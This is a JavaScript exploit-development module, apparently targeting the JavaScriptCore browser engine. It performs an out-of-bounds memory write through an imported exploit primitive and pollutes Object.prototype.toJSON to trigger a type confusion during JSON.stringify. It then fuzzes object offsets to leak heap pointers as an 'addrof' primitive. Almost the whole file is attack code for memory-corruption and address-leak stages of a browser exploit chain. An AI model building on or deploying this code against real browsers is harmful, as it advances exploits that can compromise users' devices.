// js/script3/testArrayBufferVictimCrash.mjs (v44_FuzzDataPointerOffsets)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs'; // Importar offsets do JSC para leitura de estruturas

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V44_FDPO = "OriginalHeisenbug_TypedArrayAddrof_v44_FuzzDataPointerOffsets";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let leak_target_buffer_v44 = null; // ArrayBuffer para vazar
let leak_target_dataview_v44 = null; // DataView para vazar

let victim_typed_array_ref_v44 = null;
let probe_call_count_v44 = 0;
let all_probe_interaction_details_v44 = [];
let first_call_details_object_ref_v44 = null;

const PROBE_CALL_LIMIT_V44 = 5;
const FUZZ_OFFSET_RANGE_START = 0x0;
const FUZZ_OFFSET_RANGE_END = 0x50; // Fuzzar até 0x50 (80 bytes)
const FUZZ_OFFSET_STEP = 0x8;      // Ler de 8 em 8 bytes (para ponteiros de 64 bits)

function toJSON_TA_Probe_FuzzDataPointerOffsets() {
    probe_call_count_v44++;
    const call_num = probe_call_count_v44;
    let current_call_details = { // Sempre criar um novo objeto de detalhes para esta chamada
        call_number: call_num,
        probe_variant: "TA_Probe_Addrof_v44_FuzzDataPointerOffsets",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v44),
        this_is_C1_details_obj: (this === first_call_details_object_ref_v44 && first_call_details_object_ref_v44 !== null),
        payload_A_assigned: false,
        payload_B_assigned: false,
        error_in_probe: null,
        fuzzed_leak_results: {} // Objeto para armazenar resultados do fuzzing
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. 'this' type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsC1DetailsObj? ${current_call_details.this_is_C1_details_obj}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V44) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Probe call limit.`, "warn");
            all_probe_interaction_details_v44.push(current_call_details);
            return { recursion_stopped_v44: true, call: call_num };
        }

        // --- Lógica Principal da Sonda ---

        // Caso 1: 'this' é a vítima original (primeira chamada)
        if (call_num === 1 && current_call_details.this_is_victim) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is victim. Creating and returning C1_details object.`, "info");
            first_call_details_object_ref_v44 = current_call_details; // Guarda a referência para C1_details
            all_probe_interaction_details_v44.push(current_call_details);
            return current_call_details;
        }
        // Caso 2: 'this' é o C1_details (type-confused)
        else if (current_call_details.this_is_C1_details_obj && current_call_details.this_type === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION ON C1_DETAILS_OBJECT ('this')! Attempting to assign leak targets...`, "vuln");

            if (leak_target_buffer_v44) {
                this.payload_A = leak_target_buffer_v44; // Atribui ArrayBuffer
                current_call_details.payload_A_assigned = true;
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Assigned leak_target_buffer_v44 to C1_details.payload_A.`, "info");
            }
            if (leak_target_dataview_v44) {
                this.payload_B = leak_target_dataview_v44; // Atribui DataView
                current_call_details.payload_B_assigned = true;
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Assigned leak_target_dataview_v44 to C1_details.payload_B.`, "info");
            }

            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: C1_details modified. Keys: ${Object.keys(this).join(',')}`, "info");

            all_probe_interaction_details_v44.push(current_call_details);
            return this; // Retornar o 'this' modificado (C1_details modificado)
        }
        // Caso 3: 'this' é o ArrayBuffer ou DataView que injetamos - INICIAR FUZZING DE OFFSETS AQUI
        else if (current_call_details.this_type === '[object ArrayBuffer]' || current_call_details.this_type === '[object DataView]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is an INJECTED TYPEDARRAY/ARRAYBUFFER! Initiating offset fuzzing! Type: ${current_call_details.this_type}`, "critical");
            let results_for_this_object = {};
            let view_on_this_target;

            try {
                if (current_call_details.this_type === '[object ArrayBuffer]') {
                    view_on_this_target = new DataView(this);
                } else { // [object DataView]
                    if (this instanceof DataView) {
                        view_on_this_target = this;
                    } else if (this.buffer instanceof ArrayBuffer) { // É uma TypedArray
                        view_on_this_target = new DataView(this.buffer, this.byteOffset, this.byteLength);
                    } else {
                        throw new Error("Cannot create DataView from this type for fuzzing.");
                    }
                }

                for (let offset = FUZZ_OFFSET_RANGE_START; offset <= FUZZ_OFFSET_RANGE_END; offset += FUZZ_OFFSET_STEP) {
                    if (view_on_this_target.byteLength >= (offset + 8)) { // Precisa de pelo menos 8 bytes para ler um 64-bit value
                        try {
                            let low = view_on_this_target.getUint32(offset, true);
                            let high = view_on_this_target.getUint32(offset + 4, true);

                            let int64_val = new AdvancedInt64(low, high);
                            let temp_buffer_for_float_conversion = new ArrayBuffer(8);
                            let temp_float64_view_conversion = new Float64Array(temp_buffer_for_float_conversion);
                            let temp_uint32_view_conversion = new Uint32Array(temp_buffer_for_float_conversion);

                            temp_uint32_view_conversion[0] = int64_val.low();
                            temp_uint32_view_conversion[1] = int64_val.high();
                            let leaked_val_as_float = temp_float64_view_conversion[0];

                            // Armazena o valor (numérico) para o offset atual
                            results_for_this_object[toHex(offset, 16)] = leaked_val_as_float;
                            logS3(`[${current_call_details.probe_variant}] Call #${call_num} - Offset ${toHex(offset, 16)}: Leaked value: ${toHex(low)}:${toHex(high)} (as double: ${leaked_val_as_float})`, "info");

                            // Se o valor parecer um ponteiro, podemos retorná-lo imediatamente para o stringifyOutput
                            if (int64_val.high() > 0x70000000 || int64_val.low() > 0x10000000 || (int64_val.high() & 0xFF000000) === 0x80000000) {
                                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Found a potential pointer at offset ${toHex(offset, 16)}!`, "vuln");
                                current_call_details.fuzzed_leaked_pointer = leaked_val_as_float;
                                current_call_details.fuzzed_leaked_obj_type = current_call_details.this_type;
                                current_call_details.fuzzed_leaked_offset = offset;
                                all_probe_interaction_details_v44.push(current_call_details);
                                return { leaked_address_v44: leaked_val_as_float, leaked_obj_type: current_call_details.this_type, from_offset: toHex(offset, 16) };
                            }

                        } catch (e_read) {
                            results_for_this_object[toHex(offset, 16)] = `ERROR: ${e_read.message}`;
                            logS3(`[${current_call_details.probe_variant}] Call #${call_num} - Offset ${toHex(offset, 16)}: Read Error: ${e_read.name} - ${e_read.message}`, "warn");
                        }
                    } else {
                        results_for_this_object[toHex(offset, 16)] = `OUT_OF_BOUNDS (req: ${offset+8}, has: ${view_on_this_target.byteLength})`;
                    }
                }
                current_call_details.fuzzed_leak_results = results_for_this_object; // Armazena todos os resultados do fuzzing
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Completed offset fuzzing. Results: ${JSON.stringify(results_for_this_object)}`, "info");
                all_probe_interaction_details_v44.push(current_call_details);
                return { fuzzed_results_v44: results_for_this_object, obj_type: current_call_details.this_type }; // Retorna todos os resultados
            } catch (e_fuzz_setup) {
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: CRITICAL ERROR during fuzzing setup/DataView creation (${current_call_details.this_type}): ${e_fuzz_setup.name} - ${e_fuzz_setup.message}`, "error");
                current_call_details.error_in_probe = e_fuzz_setup.message;
                all_probe_interaction_details_v44.push(current_call_details);
                return { addrof_fuzz_error_v44: e_fuzz_setup.message, type: current_call_details.this_type };
            }
        }
        // Caso 4: Outras chamadas, ou 'this' não é o esperado
        else {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is unexpected. Type: ${current_call_details.this_type}`, "warn");
            all_probe_interaction_details_v44.push(current_call_details);
            return { generic_marker_v44: call_num };
        }

    } catch (e) {
        current_call_details.error_in_probe = e.message;
        logS3(`[${current_call_details.probe_variant}] Call #${call_num}: CRITICAL ERROR in probe: ${e.name} - ${e.message}`, "critical", FNAME_CURRENT_TEST);
        all_probe_interaction_details_v44.push(current_call_details);
        return { error_marker_v44: call_num };
    }
}

export async function executeTypedArrayVictimAddrofTest_FuzzDataPointerOffsets() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V44_FDPO}.triggerAndLog`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (FuzzDataPointerOffsets) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V44_FDPO} Init...`;

    probe_call_count_v44 = 0;
    all_probe_interaction_details_v44 = [];
    victim_typed_array_ref_v44 = null;
    first_call_details_object_ref_v44 = null;

    // Criando os objetos a vazar: um ArrayBuffer e uma DataView
    leak_target_buffer_v44 = new ArrayBuffer(0x60); // Tamanho maior para permitir mais fuzzing (0x50 + 8 = 88 bytes, então 0x60 = 96 bytes é seguro)
    leak_target_dataview_v44 = new DataView(new ArrayBuffer(0x60)); // Tamanho maior

    let errorCapturedMain = null;
    let stringifyOutput_parsed = null;
    let details_of_C1_call_after_modification = null;

    let addrof_A_result = { success: false, msg: "Addrof ArrayBuffer: Default" };
    let addrof_B_result = { success: false, msg: "Addrof DataView: Default" };
    const fillPattern = 0.44444444444444;

    let pollutionApplied = false;
    let originalToJSONDescriptor = null;
    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed. Value: ${toHex(OOB_WRITE_VALUE)}.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v44 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));
        let float64_view_on_victim_buffer = new Float64Array(victim_typed_array_ref_v44.buffer);
        for(let i = 0; i < float64_view_on_victim_buffer.length; i++) float64_view_on_victim_buffer[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v44 (Uint8Array) created. Its buffer filled.`, "test", FNAME_CURRENT_TEST);

        const ppKey = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_FuzzDataPointerOffsets, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            logS3(`  Object.prototype.toJSON polluted. Calling JSON.stringify(victim_typed_array_ref_v44)...`, "info", FNAME_CURRENT_TEST);
            let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v44);
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);

            try {
                stringifyOutput_parsed = JSON.parse(rawStringifyOutput);
            } catch (e_parse) {
                logS3(`  Error parsing stringifyOutput: ${e_parse.message}. Output was: ${rawStringifyOutput}`, "warn");
                stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
            }

            if (first_call_details_object_ref_v44) {
                try {
                    details_of_C1_call_after_modification = JSON.parse(JSON.stringify(first_call_details_object_ref_v44));
                } catch (e_circular) {
                    logS3(`  Warning: Could not capture C1_details snapshot due to circular reference: ${e_circular.message}`, "warn", FNAME_CURRENT_TEST);
                    details_of_C1_call_after_modification = { snapshot_error: e_circular.message };
                }
            }
            logS3(`  EXECUTE: Captured state of C1_details object AFTER all probe calls: ${details_of_C1_call_after_modification ? JSON.stringify(details_of_C1_call_after_modification) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            let heisenbugOnC1 = false;
            const call2Details = all_probe_interaction_details_v44.find(d => d.call_number === 2);
            if (call2Details && call2Details.this_is_C1_details_obj && call2Details.payload_A_assigned) {
                heisenbugOnC1 = true;
                logS3(`  EXECUTE: HEISENBUG & PAYLOAD ASSIGNMENT on C1_details CONFIRMED by probe Call #2!`, "vuln", FNAME_CURRENT_TEST);
            } else {
                logS3(`  EXECUTE: ALERT: Heisenbug/Payload Assignment on C1_details NOT confirmed as expected by probe Call #2.`, "error", FNAME_CURRENT_TEST);
            }

            logS3("STEP 3: Checking stringifyOutput_parsed for leaked payloads from TypedArray probe...", "warn", FNAME_CURRENT_TEST);
            if (stringifyOutput_parsed && typeof stringifyOutput_parsed === 'object') {
                // Verificar se o outputParsed contém a propriedade 'leaked_address_v44' ou 'fuzzed_results_v44'
                if (stringifyOutput_parsed.leaked_address_v44 !== undefined) {
                    const leaked_addr_val = stringifyOutput_parsed.leaked_address_v44;
                    if (typeof leaked_addr_val === 'number' && leaked_addr_val !== 0 && !isNaN(leaked_addr_val)) {
                        let p_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([leaked_addr_val]).buffer)[0], new Uint32Array(new Float64Array([leaked_addr_val]).buffer)[1]);
                        if (p_int64.high() > 0x70000000 || p_int64.low() > 0x10000000 || (p_int64.high() & 0xFF000000) === 0x80000000) {
                            if (stringifyOutput_parsed.leaked_obj_type === '[object ArrayBuffer]') {
                                addrof_A_result.success = true; addrof_A_result.msg = `SUCCESS: ArrayBuffer pointer: ${p_int64.toString(true)} (from offset ${stringifyOutput_parsed.from_offset})`;
                            } else if (stringifyOutput_parsed.leaked_obj_type === '[object DataView]') {
                                addrof_B_result.success = true; addrof_B_result.msg = `SUCCESS: DataView pointer: ${p_int64.toString(true)} (from offset ${stringifyOutput_parsed.from_offset})`;
                            } else {
                                addrof_A_result.success = true; addrof_A_result.msg = `SUCCESS: Unknown object pointer: ${p_int64.toString(true)} (type: ${stringifyOutput_parsed.leaked_obj_type}, offset: ${stringifyOutput_parsed.from_offset})`;
                            }
                        } else {
                            addrof_A_result.msg = `Leaked number is not a pointer pattern: ${leaked_addr_val}`;
                        }
                    } else {
                        addrof_A_result.msg = `Leaked value not a useful number: ${JSON.stringify(leaked_addr_val)}`;
                    }
                } else if (stringifyOutput_parsed.fuzzed_results_v44 !== undefined) {
                    logS3(`  Found fuzzed_results_v44 in stringifyOutput_parsed. Analyzing for pointers...`, "info");
                    let found_ptr_A = false;
                    let found_ptr_B = false;

                    // Itera sobre os resultados do fuzzing para ArrayBuffer (Call #3)
                    const arrayBufferFuzzResults = all_probe_interaction_details_v44.find(d => d.this_type === '[object ArrayBuffer]' && d.fuzzed_leak_results);
                    if (arrayBufferFuzzResults) {
                        for (const offsetHex in arrayBufferFuzzResults.fuzzed_leak_results) {
                            const val = arrayBufferFuzzResults.fuzzed_leak_results[offsetHex];
                            if (typeof val === 'number' && val !== 0 && !isNaN(val)) {
                                let p_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val]).buffer)[0], new Uint32Array(new Float64Array([val]).buffer)[1]);
                                if (p_int64.high() > 0x70000000 || p_int64.low() > 0x10000000 || (p_int64.high() & 0xFF000000) === 0x80000000) {
                                    addrof_A_result.success = true; addrof_A_result.msg = `SUCCESS: ArrayBuffer pointer: ${p_int64.toString(true)} (from offset ${offsetHex})`;
                                    found_ptr_A = true; break;
                                }
                            }
                        }
                    }
                    if (!found_ptr_A) addrof_A_result.msg = `No pointer found in fuzzed ArrayBuffer results.`;

                    // Itera sobre os resultados do fuzzing para DataView (Call #4)
                    const dataViewFuzzResults = all_probe_interaction_details_v44.find(d => d.this_type === '[object DataView]' && d.fuzzed_leak_results);
                    if (dataViewFuzzResults) {
                        for (const offsetHex in dataViewFuzzResults.fuzzed_leak_results) {
                            const val = dataViewFuzzResults.fuzzed_leak_results[offsetHex];
                            if (typeof val === 'number' && val !== 0 && !isNaN(val)) {
                                let p_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val]).buffer)[0], new Uint32Array(new Float64Array([val]).buffer)[1]);
                                if (p_int64.high() > 0x70000000 || p_int64.low() > 0x10000000 || (p_int64.high() & 0xFF000000) === 0x80000000) {
                                    addrof_B_result.success = true; addrof_B_result.msg = `SUCCESS: DataView pointer: ${p_int64.toString(true)} (from offset ${offsetHex})`;
                                    found_ptr_B = true; break;
                                }
                            }
                        }
                    }
                    if (!found_ptr_B) addrof_B_result.msg = `No pointer found in fuzzed DataView results.`;

                } else {
                    addrof_A_result.msg = "stringifyOutput_parsed did not contain 'leaked_address_v44' or 'fuzzed_results_v44'.";
                    addrof_B_result.msg = "stringifyOutput_parsed did not contain 'leaked_address_v44' or 'fuzzed_results_v44'.";
                }
            } else {
                addrof_A_result.msg = "stringifyOutput_parsed was not an object or was null.";
                addrof_B_result.msg = "stringifyOutput_parsed was not an object or was null.";
            }


            if (addrof_A_result.success || addrof_B_result.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V44_FDPO}: Addr SUCCESS!`;
            } else if (heisenbugOnC1) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V44_FDPO}: C1_TC OK, Addr Fail`;
            } else {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V44_FDPO}: No C1_TC?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`  CRITICAL ERROR during JSON.stringify or processing: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V44_FDPO}: Stringify/Log ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
                logS3(`  Object.prototype.toJSON restored.`, "info", FNAME_CURRENT_TEST);
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`  CRITICAL ERROR in main test execution: ${e_outer_main.name} - ${e_outer_main.message}${e_outer_main.stack ? '\n'+e_outer_main.stack : ''}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V44_FDPO} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v44}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof A: Success=${addrof_A_result.success}, Msg='${addrof_A_result.msg}'`, addrof_A_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof B: Success=${addrof_B_result.success}, Msg='${addrof_B_result.msg}'`, addrof_B_result.success ? "good" : "warn", FNAME_CURRENT_TEST);

        victim_typed_array_ref_v44 = null;
        all_probe_interaction_details_v44 = [];
        probe_call_count_v44 = 0;
        first_call_details_object_ref_v44 = null;
        leak_target_buffer_v44 = null;
        leak_target_dataview_v44 = null;
    }
    return {
        errorCapturedMain: errorCapturedMain,
        potentiallyCrashed: errorCapturedMain?.name === 'RangeError',
        stringifyResult: stringifyOutput_parsed,
        toJSON_details: details_of_C1_call_after_modification,
        all_probe_calls_for_analysis: [...all_probe_interaction_details_v44],
        total_probe_calls: probe_call_count_v44,
        addrof_A_result: addrof_A_result,
        addrof_B_result: addrof_B_result
    };
}
